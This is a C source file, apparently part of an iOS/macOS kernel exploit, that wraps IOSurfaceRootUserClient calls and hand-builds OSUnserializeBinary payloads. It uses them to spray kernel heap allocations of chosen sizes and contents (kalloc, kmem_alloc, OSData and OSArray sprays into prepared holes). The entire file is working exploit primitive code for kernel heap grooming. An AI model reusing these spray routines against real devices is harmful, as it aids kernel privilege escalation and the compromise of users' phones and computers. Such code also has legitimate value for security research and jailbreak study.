/*
 * iosurface.c
 * Brandon Azad
 */

#include <assert.h>
#include <pthread.h>
#include <string.h>
#include <stdlib.h>

#include "IOKit/IOKitLib.h"

#include "mycommon.h"
#include "utils.h"

enum {
    kOSSerializeDictionary      = 0x01000000,
    kOSSerializeArray           = 0x02000000,
    kOSSerializeSet             = 0x03000000,
    kOSSerializeNumber          = 0x04000000,
    kOSSerializeSymbol          = 0x08000000,
    kOSSerializeString          = 0x09000000,
    kOSSerializeData            = 0x0a000000,
    kOSSerializeBoolean         = 0x0b000000,
    kOSSerializeObject          = 0x0c000000,
    kOSSerializeTypeMask        = 0x7f000000,
    kOSSerializeDataMask        = 0x00ffffff,
    kOSSerializeEndCollection    = 0x80000000,
    kOSSerializeBinarySignature = 0x000000d3,
};

// This value encodes to 0x00ffffff, so any larger value will cause IOSurface_property_key() to
// wrap and collide with a smaller value.
#define MAX_IOSURFACE_PROPERTY_INDEX    (0x00fd02fe)

// ---- IOSurface types ---------------------------------------------------------------------------

struct _IOSurfaceFastCreateArgs {
    uint64_t address;
    uint32_t width;
    uint32_t height;
    uint32_t pixel_format;
    uint32_t bytes_per_element;
    uint32_t bytes_per_row;
    uint32_t alloc_size;
};

struct IOSurfaceLockResult {
    uint8_t _pad1[0x18];
    uint32_t surface_id;
    //uint8_t _pad2[0xf60-0x18-0x4];
    uint8_t _pad2[0xdd0-0x18-0x4];
};

struct IOSurfaceValueArgs {
    uint32_t surface_id;
    uint32_t field_4;
    union {
        uint32_t xml[0];
        char string[0];
    };
};

struct IOSurfaceValueResultArgs {
    uint32_t field_0;
};

// ---- Global variables --------------------------------------------------------------------------

static uint32_t IOSurface_property_index = 0;

// Is the IOSurface subsystem initialized?
static bool IOSurface_initialized;

// The IOSurfaceRoot service.
mach_port_t IOSurfaceRoot;

// An IOSurfaceRootUserClient instance.
mach_port_t IOSurfaceRootUserClient;

// The ID of the IOSurface we're using.
uint32_t IOSurface_id;

// ---- Initialization ----------------------------------------------------------------------------

uint32_t iosurface_create_fast()
{
    kern_return_t kr;
    struct _IOSurfaceFastCreateArgs create_args = { .alloc_size = (uint32_t) g_exp.pagesize };
    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = sizeof(lock_result);
    kr = IOConnectCallMethod(
            IOSurfaceRootUserClient,
            6, // create_surface_client_fast_path
            NULL, 0,
            &create_args, sizeof(create_args),
            NULL, NULL,
            &lock_result, &lock_result_size);
    if (kr != KERN_SUCCESS) {
        util_error("could not create %s: 0x%x", "IOSurfaceClient", kr);
        return 0;
    }
    return lock_result.surface_id;
}

bool
IOSurface_init() {
    if (IOSurface_initialized) {
        return true;
    }
    IOSurfaceRoot = IOServiceGetMatchingService(
            kIOMasterPortDefault,
            IOServiceMatching("IOSurfaceRoot"));
    if (IOSurfaceRoot == MACH_PORT_NULL) {
        util_error("could not find %s", "IOSurfaceRoot");
        return false;
    }
    kern_return_t kr = IOServiceOpen(
            IOSurfaceRoot,
            mach_task_self(),
            0,
            &IOSurfaceRootUserClient);
    if (kr != KERN_SUCCESS) {
        util_error("could not open %s", "IOSurfaceRootUserClient");
        return false;
    }
    struct _IOSurfaceFastCreateArgs create_args = { .alloc_size = (uint32_t) g_exp.pagesize };
    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = sizeof(lock_result);
    kr = IOConnectCallMethod(
            IOSurfaceRootUserClient,
            6, // create_surface_client_fast_path
            NULL, 0,
            &create_args, sizeof(create_args),
            NULL, NULL,
            &lock_result, &lock_result_size);
    if (kr != KERN_SUCCESS) {
        util_error("could not create %s: 0x%x", "IOSurfaceClient", kr);
        return false;
    }
    IOSurface_id = lock_result.surface_id;
    IOSurface_initialized = true;
    return true;
}

void
IOSurface_deinit() {
    assert(IOSurface_initialized);
    IOSurface_initialized = false;
    IOSurface_id = 0;
    IOServiceClose(IOSurfaceRootUserClient);
    IOObjectRelease(IOSurfaceRoot);
}

// ---- External methods --------------------------------------------------------------------------

/*
 * IOSurface_set_value
 *
 * Description:
 *     A wrapper around IOSurfaceRootUserClient::set_value().
 */
static bool
IOSurface_set_value(const struct IOSurfaceValueArgs *args, size_t args_size) {
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    kern_return_t kr = IOConnectCallMethod(
            IOSurfaceRootUserClient,
            9, // set_value
            NULL, 0,
            args, args_size,
            NULL, NULL,
            &result, &result_size);
    if (kr != KERN_SUCCESS) {
        util_error("Failed to %s value in %s: 0x%x", "set", "IOSurface", kr);
        return false;
    }
    return true;
}

/*
 * IOSurface_get_value
 *
 * Description:
 *     A wrapper around IOSurfaceRootUserClient::get_value().
 */
__attribute__((unused))
static bool
IOSurface_get_value(const struct IOSurfaceValueArgs *in, size_t in_size,
        struct IOSurfaceValueArgs *out, size_t *out_size) {
    kern_return_t kr = IOConnectCallMethod(
            IOSurfaceRootUserClient,
            10, // get_value
            NULL, 0,
            in, in_size,
            NULL, NULL,
            out, out_size);
    if (kr != KERN_SUCCESS) {
        util_error("Failed to %s value in %s: 0x%x", "get", "IOSurface", kr);
        return false;
    }
    return true;
}

/*
 * IOSurface_remove_value
 *
 * Description:
 *     A wrapper around IOSurfaceRootUserClient::remove_value().
 */
static bool
IOSurface_remove_value(const struct IOSurfaceValueArgs *args, size_t args_size) {
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    kern_return_t kr = IOConnectCallMethod(
            IOSurfaceRootUserClient,
            11, // remove_value
            NULL, 0,
            args, args_size,
            NULL, NULL,
            &result, &result_size);
    if (kr != KERN_SUCCESS) {
        util_error("Failed to %s value in %s: 0x%x", "remove", "IOSurface", kr);
        return false;
    }
    return true;
}

// ---- Property encoding -------------------------------------------------------------------------

/*
 * base255_encode
 *
 * Description:
 *     Encode a 32-bit integer so that it does not contain any null bytes.
 */
static uint32_t
base255_encode(uint32_t value) {
    uint32_t encoded = 0;
    for (unsigned i = 0; i < sizeof(value); i++) {
        encoded |= ((value % 255) + 1) << (8 * i);
        value /= 255;
    }
    return encoded;
}

uint32_t IOSurface_new_property_key(void)
{
    uint32_t property_index = IOSurface_property_index;
    IOSurface_property_index += 1;
    assert(property_index <= MAX_IOSURFACE_PROPERTY_INDEX);
    uint32_t encoded = base255_encode(property_index);
    assert((encoded >> 24) == 0x01);
    return encoded & ~0xff000000;
}

// ---- IOSurface_remove_property -----------------------------------------------------------------

bool
IOSurface_remove_property(uint32_t property_key) {
    assert(IOSurface_initialized);
    struct {
        struct IOSurfaceValueArgs header;
        uint32_t key;
    } args;
    args.header.surface_id = IOSurface_id;
    args.key = property_key;
    return IOSurface_remove_value(&args.header, sizeof(args));
}

// ---- IOSurface_kalloc_fast ---------------------------------------------------------------------

bool
IOSurface_kalloc_fast(uint32_t property_key, size_t kalloc_size) {
    assert(kalloc_size <= 0x10000000);
    // Make sure our IOSurface is initialized.
    bool ok = IOSurface_init();
    if (!ok) {
        return false;
    }
    // OSDictionary::initWithCapacity() will create a kalloc allocation of size 16 * capacity.
    // However, we're constrained by OSUnserializeBinary() to a maximum capacity value of
    // 0x00ffffff.
    kalloc_size = (kalloc_size + 0xf) & ~0xf;
    uint32_t capacity = (uint32_t) (kalloc_size / 16);
    if (capacity > 0x00ffffff) {
        capacity = 0x00ffffff;
    }
    // IOSurfaceRootUserClient::set_value() expects a serialized OSArray containing 2 elements:
    // the property value at index 0 and the property key at index 1.
    struct {
        struct IOSurfaceValueArgs header;
        uint32_t xml[8];
    } args;
    args.header.surface_id = IOSurface_id;
    args.xml[0] = kOSSerializeBinarySignature;
    args.xml[1] = kOSSerializeArray | 2 | kOSSerializeEndCollection;            // <array capacity="2">
    args.xml[2] = kOSSerializeDictionary | capacity;                //   <dict capacity="capacity">
    args.xml[3] = kOSSerializeSymbol | 2;                        //     <sym len="2">
    args.xml[4] = 0xaa0000bb;                            //       \xbb</sym>
    args.xml[5] = kOSSerializeBoolean | kOSSerializeEndCollection;            //     <false/></dict>
    args.xml[6] = kOSSerializeSymbol | sizeof(uint32_t) | kOSSerializeEndCollection;    //   <sym len="4">
    args.xml[7] = property_key;                            //     key</sym></array>
    ok = IOSurface_set_value(&args.header, sizeof(args));
    return ok;
}

// ---- IOSurface_kmem_alloc_fast -----------------------------------------------------------------

static size_t
xml_units_for_size(size_t size) {
    return (size + sizeof(uint32_t) - 1) / sizeof(uint32_t);
}

size_t
IOSurface_kmem_alloc_fast_buffer_size(size_t kmem_alloc_size) {
    if (kmem_alloc_size < g_exp.pagesize || kmem_alloc_size > 0xffffff) {
        return 0;
    }
    size_t header_size = sizeof(struct IOSurfaceValueArgs);
    size_t data_units = xml_units_for_size(kmem_alloc_size);
    // Magic + Array(2) + Data(size) + DATA + Sym(1) + SYM
    return header_size + (1 + 1 + 1 + data_units + 1 + 1) * sizeof(uint32_t);
}

bool
IOSurface_kmem_alloc_fast_prepare(
        size_t kmem_alloc_size,
        void *kmem_alloc_fast_buffer,
        size_t *kmem_alloc_fast_buffer_size,
        void (^initialize_data)(void *data)) {
    // OSData::initWithCapacity() will create a kmem_alloc allocation of the specified
    // capacity. However, we're constrained by OSUnserializeBinary() to a maximum length of
    // 0x00ffffff.
    assert(g_exp.pagesize <= kmem_alloc_size && kmem_alloc_size <= 0xffffff);
    if (kmem_alloc_size < g_exp.pagesize || kmem_alloc_size > 0xffffff) {
        return false;
    }
    // Check that the buffer size is at least the minimum.
    size_t exact_size = IOSurface_kmem_alloc_fast_buffer_size(kmem_alloc_size);
    size_t buffer_size = *kmem_alloc_fast_buffer_size;
    *kmem_alloc_fast_buffer_size = exact_size;
    if (buffer_size < exact_size) {
        return false;
    }
    // IOSurfaceRootUserClient::set_value() expects a serialized OSArray containing 2 elements:
    // the property value at index 0 and the property key at index 1.
    struct IOSurfaceValueArgs *args = kmem_alloc_fast_buffer;
    uint32_t *xml = args->xml;
    *xml++ = kOSSerializeBinarySignature;
    *xml++ = kOSSerializeArray | 2 | kOSSerializeEndCollection;            // <array capacity="2">
    *xml++ = kOSSerializeData | (uint32_t) kmem_alloc_size;                //   <data len="size">
    initialize_data(xml);                                //     ...
    xml   += xml_units_for_size(kmem_alloc_size);                    //   </data>
    *xml++ = kOSSerializeSymbol | sizeof(uint32_t) | kOSSerializeEndCollection;    //   <sym len="4">
    args->field_4 = (uint32_t) (xml - args->xml);                    //     ...
    xml++;                                        //   </sym></array>
    // Verify the size.
    size_t size = ((uint8_t *) xml - (uint8_t *) args);
    assert(size == exact_size);
    return true;
}

bool
IOSurface_kmem_alloc_fast(uint32_t property_key,
        void *kmem_alloc_fast_buffer, size_t kmem_alloc_fast_buffer_size) {
    // Make sure our IOSurface is initialized.
    bool ok = IOSurface_init();
    if (!ok) {
        return false;
    }
    // Set the IOSurface ID and initialize the property index in the XML.
    struct IOSurfaceValueArgs *args = kmem_alloc_fast_buffer;
    args->surface_id = IOSurface_id;
    args->xml[args->field_4] = property_key;
    // Call IOSurfaceRootUserClient::set_value().
    return IOSurface_set_value(args, kmem_alloc_fast_buffer_size);
}

// ---- IOSurface_kmem_alloc_array_fast -----------------------------------------------------------

size_t
IOSurface_kmem_alloc_array_fast_buffer_size(size_t kmem_alloc_size, size_t kmem_alloc_count) {
    if (kmem_alloc_size < g_exp.pagesize || kmem_alloc_size > 0xffffff) {
        return 0;
    }
    size_t header_size = sizeof(struct IOSurfaceValueArgs);
    size_t data_units = xml_units_for_size(kmem_alloc_size);
    // Magic + Array(2) + Array(count) + count * (Data(size) + DATA) + Sym(1) + SYM
    return header_size + (3 + kmem_alloc_count * (1 + data_units) + 2) * sizeof(uint32_t);
}

bool
IOSurface_kmem_alloc_array_fast_prepare(
        size_t kmem_alloc_size,
        size_t kmem_alloc_count,
        void *kmem_alloc_array_fast_buffer,
        size_t *kmem_alloc_array_fast_buffer_size,
        void (^initialize_data)(void *data, size_t index)) {
    // OSData::initWithCapacity() will create a kmem_alloc allocation of the specified
    // capacity. However, we're constrained by OSUnserializeBinary() to a maximum length of
    // 0x00ffffff for both the OSData and the OSArray.
    assert(g_exp.pagesize <= kmem_alloc_size && kmem_alloc_size <= 0xffffff
            && kmem_alloc_count <= 0xffffff);
    if (kmem_alloc_size < g_exp.pagesize || kmem_alloc_size > 0xffffff
            || kmem_alloc_count > 0xffffff) {
        return false;
    }
    // Check that the buffer size is at least the minimum.
    size_t exact_size = IOSurface_kmem_alloc_array_fast_buffer_size(
            kmem_alloc_size, kmem_alloc_count);
    size_t buffer_size = *kmem_alloc_array_fast_buffer_size;
    *kmem_alloc_array_fast_buffer_size = exact_size;
    if (buffer_size < exact_size) {
        return false;
    }
    // IOSurfaceRootUserClient::set_value() expects a serialized OSArray containing 2 elements:
    // the property value at index 0 and the property key at index 1.
    struct IOSurfaceValueArgs *args = kmem_alloc_array_fast_buffer;
    uint32_t *xml = args->xml;
    *xml++ = kOSSerializeBinarySignature;
    *xml++ = kOSSerializeArray | 2 | kOSSerializeEndCollection;            // <array capacity="2">
    *xml++ = kOSSerializeArray | (uint32_t) kmem_alloc_count;            //   <array len="count">
    for (size_t i = 0; i < kmem_alloc_count; i++) {                    //     <!-- count copies -->
        uint32_t flags = (i == kmem_alloc_count - 1 ? kOSSerializeEndCollection : 0);    //     <!-- ends array -->
        *xml++ = kOSSerializeData | (uint32_t) kmem_alloc_size | flags;        //     <data len="size">
        initialize_data(xml, i);                        //       ...
        xml   += xml_units_for_size(kmem_alloc_size);                //     </data>
    }                                        //   </array>
    *xml++ = kOSSerializeSymbol | sizeof(uint32_t) | kOSSerializeEndCollection;    //   <sym len="4">
    args->field_4 = (uint32_t) (xml - args->xml);                    //     ...
    xml++;                                        //   </sym></array>
    // Verify the size.
    size_t size = ((uint8_t *) xml - (uint8_t *) args);
    assert(size == exact_size);
    return true;
}

bool
IOSurface_kmem_alloc_array_fast(uint32_t property_key,
        void *kmem_alloc_array_fast_buffer, size_t kmem_alloc_array_fast_buffer_size) {
    // Make sure our IOSurface is initialized.
    bool ok = IOSurface_init();
    if (!ok) {
        return false;
    }
    // Set the IOSurface ID and initialize the property index in the XML.
    struct IOSurfaceValueArgs *args = kmem_alloc_array_fast_buffer;
    args->surface_id = IOSurface_id;
    args->xml[args->field_4] = property_key;
    // Call IOSurfaceRootUserClient::set_value().
    return IOSurface_set_value(args, kmem_alloc_array_fast_buffer_size);
}

// ---- Convenience API ---------------------------------------------------------------------------

// Compute the number of elements to spray for IOSurface_kmem_alloc_array_fast_().
static size_t
IOSurface_kmem_alloc_array_fast_count_(size_t kmem_alloc_size, size_t spray_size) {
    size_t alloc_size = (kmem_alloc_size + (g_exp.pagesize - 1)) & ~(g_exp.pagesize - 1);
    return (spray_size + alloc_size - 1) / alloc_size;
}

bool
IOSurface_kmem_alloc_array_fast_prepare_(
        size_t kmem_alloc_size,
        size_t spray_size,
        void *kmem_alloc_array_fast_buffer,
        size_t *kmem_alloc_array_fast_buffer_size,
        void (^initialize_data)(void *data, size_t index)) {
    assert(kmem_alloc_size <= spray_size && spray_size <= *kmem_alloc_array_fast_buffer_size);
    size_t count = IOSurface_kmem_alloc_array_fast_count_(kmem_alloc_size, spray_size);
    return IOSurface_kmem_alloc_array_fast_prepare(
            kmem_alloc_size,
            count,
            kmem_alloc_array_fast_buffer,
            kmem_alloc_array_fast_buffer_size,
            initialize_data);
}

// ---- renamed API ---------------------------------------------------------------------------

void OSArray_fast_alloc(uint32_t property_key, size_t kalloc_size)
{
    assert(kalloc_size <= 0x8000000);
    // OSDictionary::initWithCapacity() will create a kalloc allocation of size 16 * capacity.
    // However, we're constrained by OSUnserializeBinary() to a maximum capacity value of
    // 0x00ffffff.
    kalloc_size = (kalloc_size + 0xf) & ~0xf;
    uint32_t capacity = (uint32_t) (kalloc_size / 8);
    if (capacity > 0x00ffffff) {
        capacity = 0x00ffffff;
    }
    // IOSurfaceRootUserClient::set_value() expects a serialized OSArray containing 2 elements:
    // the property value at index 0 and the property key at index 1.
#define INT_N 20
    struct {
        struct IOSurfaceValueArgs header;
        uint32_t xml[INT_N];
    } args;
    args.header.surface_id = IOSurface_id;
    args.header.field_4 = 0;
    int pos = 0;
    args.xml[pos++] = kOSSerializeBinarySignature;
    args.xml[pos++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;         // <array capacity="2">

    args.xml[pos++] = kOSSerializeArray | capacity;                //   <array capacity="capacity">

    const char *data = "OSData";
    const uint32_t data_len = (uint32_t)strlen(data) + 1;
    args.xml[pos++] = kOSSerializeData | data_len;// | kOSSerializeEndCollection;
    memcpy(&args.xml[pos], data, data_len);
    pos += (data_len + 3) / 4;
    args.xml[pos++] = kOSSerializeBoolean | 1 | kOSSerializeEndCollection;

    args.xml[pos++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection; //   <sym len="4">
    args.xml[pos++] = property_key;                         //     key</sym></array>
    args.xml[pos++] = 0;
    assert(pos <= INT_N);
#undef INT_N
    bool ok = IOSurface_set_value(&args.header, sizeof(args));
    assert(ok == true);
}

void OSData_kmem_alloc(uint32_t property_key, void *data, size_t size, void *holedata, size_t holesize)
{
    assert(holesize > 0x1000); // 16KB page differ?
    if (size < g_exp.pagesize) {
        fail("[IOSurface] Size too small for kmem_alloc");
    }
    if (size > 0x00ffffff) {
        fail("[IOSurface] Size too big for OSUnserializeBinary");
    }

    size_t args_size = sizeof(struct IOSurfaceValueArgs) + ((size + 3)/4) * 4 + 6 * 4;
    if (args_size > holesize) {
        fail("[IOSurface] Need bigger hole");
    }

    struct IOSurfaceValueArgs *args = holedata; // speed up, no need to malloc
    args->surface_id = IOSurface_id;
    args->field_4 = 0;

    int pos = 0;
    args->xml[pos++] = kOSSerializeBinarySignature;
    args->xml[pos++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->xml[pos++] = kOSSerializeData | (uint32_t)size;
    memcpy(&args->xml[pos], data, size);
    pos += (size + 3)/4;
    args->xml[pos++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->xml[pos++] = property_key;
    args->xml[pos++] = 0;

    bool ok = IOSurface_set_value(args, holesize);
    assert(ok == true);
}

void iosurface_get_property(uint32_t key, void *output, size_t *outputSize)
{
    uint64_t payload[2];
    payload[0] = IOSurface_id;
    payload[1] = key;

    bool ok = IOSurface_get_value((struct IOSurfaceValueArgs *)payload, sizeof(payload), output, outputSize);
    assert(ok == true);
}
